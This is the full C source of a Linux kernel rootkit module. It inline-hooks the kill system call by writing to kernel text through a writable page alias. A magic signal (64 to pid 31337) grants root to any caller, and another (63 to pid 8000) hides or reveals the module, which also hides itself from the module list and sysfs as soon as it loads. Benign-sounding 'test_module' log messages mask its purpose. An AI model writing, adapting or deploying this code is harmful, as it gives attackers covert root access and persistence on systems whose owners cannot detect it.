#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/sched.h>
#include <linux/version.h>
#include <linux/limits.h>
#include <linux/slab.h>
#include <linux/cred.h>
#include <linux/list.h>
#include <linux/kobject.h>
#include <linux/kprobes.h>
#include <linux/mm.h>
#include <linux/vmalloc.h>
#include <asm/page.h>

#define MOD_REVEAL 8000
#define GET_ROOT   31337

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Research Implementation");
MODULE_DESCRIPTION("Remapped Inline Hook Signal Hijacker");

/* Forward declaration to fix compiler warnings */
asmlinkage long notrace hooked_sys_kill(const struct pt_regs *regs);

static struct list_head *prev_module;
static struct kobject *kobj_parent;
static struct list_head *saved_kobj_entry;
static short hidden = 0;

#define HOOK_SIZE 12
static unsigned char original_bytes[HOOK_SIZE];
static void *target_address = NULL;

typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
static kallsyms_lookup_name_t local_kallsyms_lookup_name = NULL;

/* 
 * Safely writes to write-protected kernel text areas by creating a duplicate
 * virtual mapping pointing to the same physical page, flagged with write access.
 */
static void notrace safe_kernel_write(void *target, const void *src, size_t len)
{
    struct page *page_ptr;
    void *writable_mapping;
    unsigned long page_offset = (unsigned long)target & (PAGE_SIZE - 1);

    /* Find the physical page structure holding the target virtual address */
    if (virt_addr_valid(target)) {
        page_ptr = virt_to_page(target);
    } else {
        page_ptr = vmalloc_to_page(target);
    }

    if (!page_ptr) {
        pr_err("test_module: Failed to resolve physical page backing structure.\n");
        return;
    }

    /* Map the physical page to a temporary, writable kernel mapping */
    writable_mapping = vmap(&page_ptr, 1, VM_MAP, PAGE_KERNEL);
    if (!writable_mapping) {
        pr_err("test_module: Virtual page mapping reallocation failed.\n");
        return;
    }

    /* Apply memory alterations onto the writable alias */
    memcpy(writable_mapping + page_offset, src, len);

    /* Instantly unmap to flush CPU TLB caches and lock down permissions */
    vunmap(writable_mapping);
}

static void notrace set_root(void)
{
    struct cred *new_creds = prepare_creds();
    if (!new_creds)
        return;

    new_creds->uid.val  = 0;
    new_creds->gid.val  = 0;
    new_creds->euid.val = 0;
    new_creds->egid.val = 0;
    new_creds->suid.val = 0;
    new_creds->sgid.val = 0;
    new_creds->fsuid.val = 0;
    new_creds->fsgid.val = 0;

    commit_creds(new_creds);
}

static void notrace hide_me(void)
{
    if (hidden)
        return;

    prev_module = THIS_MODULE->list.prev;
    kobj_parent = THIS_MODULE->mkobj.kobj.parent;
    saved_kobj_entry = &THIS_MODULE->mkobj.kobj.entry;

    list_del(&THIS_MODULE->list);

    if (THIS_MODULE->mkobj.kobj.entry.prev) {
        saved_kobj_entry = THIS_MODULE->mkobj.kobj.entry.prev;
        list_del(&THIS_MODULE->mkobj.kobj.entry);
    }

    hidden = 1;
}

static void notrace show_me(void)
{
    if (!hidden)
        return;

    list_add(&THIS_MODULE->list, prev_module);
    if (saved_kobj_entry)
        list_add(&THIS_MODULE->mkobj.kobj.entry, saved_kobj_entry);

    hidden = 0;
}

asmlinkage long notrace hooked_sys_kill(const struct pt_regs *regs)
{
    long pid = regs->di;  
    int sig = regs->si;   

    if (sig == 64 && pid == GET_ROOT) {
        set_root();
        return 0;
    }

    if (sig == 63 && pid == MOD_REVEAL) {
        if (hidden)
            show_me();
        else
            hide_me();
        return 0;
    }

    /* Restore native execution structure via remapped layout */
    safe_kernel_write(target_address, original_bytes, HOOK_SIZE);

    /* Process original call stack natively */
    long (*original_sys_kill)(const struct pt_regs *) = target_address;
    long ret = original_sys_kill(regs);

    /* Re-patch jump footprint safely */
    unsigned char jump_code[HOOK_SIZE] = {
        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, /* mov rax, <addr> */
        0xFF, 0xE0                                                 /* jmp rax */
    };
    uint64_t addr = (uint64_t)hooked_sys_kill;
    memcpy(jump_code + 2, &addr, sizeof(addr));

    safe_kernel_write(target_address, jump_code, HOOK_SIZE);

    return ret;
}

static int __init notrace modrootshell_init(void)
{
    struct kprobe kp;
    int ret;
    
    unsigned char jump_code[HOOK_SIZE] = {
        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, /* mov rax, <addr> */
        0xFF, 0xE0                                                 /* jmp rax */
    };
    uint64_t addr = (uint64_t)hooked_sys_kill;

    /* Transient kprobe resolution strategy to circumvent missing export constraints */
    memset(&kp, 0, sizeof(kp));
    kp.symbol_name = "kallsyms_lookup_name";
    ret = register_kprobe(&kp);
    if (ret < 0) {
        pr_err("test_module: Lookup map generation initialization failed (%d)\n", ret);
        return ret;
    }
    local_kallsyms_lookup_name = (kallsyms_lookup_name_t)kp.addr;
    unregister_kprobe(&kp);

    /* Extract non-exported internal execution address symbol target */
    target_address = (void *)local_kallsyms_lookup_name("__x64_sys_kill");
    if (!target_address) {
        pr_err("test_module: Verification target symbol reference not resolved.\n");
        return -ENOENT;
    }

    /* Shift copy target index offset (+2 bytes) to bypass opcodes */
    memcpy(jump_code + 2, &addr, sizeof(addr));
    memcpy(original_bytes, target_address, HOOK_SIZE);

    /* Perform write using memory virtual descriptor aliasing allocation */
    safe_kernel_write(target_address, jump_code, HOOK_SIZE);

    pr_info("test_module: Compliant inline memory patch fully active.\n");
    hide_me(); 
    return 0;
}

static void __exit notrace modrootshell_exit(void)
{
    if (target_address) {
        safe_kernel_write(target_address, original_bytes, HOOK_SIZE);
    }
    pr_info("test_module: System unpatched cleanly via remapping hooks.\n");
}

module_init(modrootshell_init);
module_exit(modrootshell_exit);
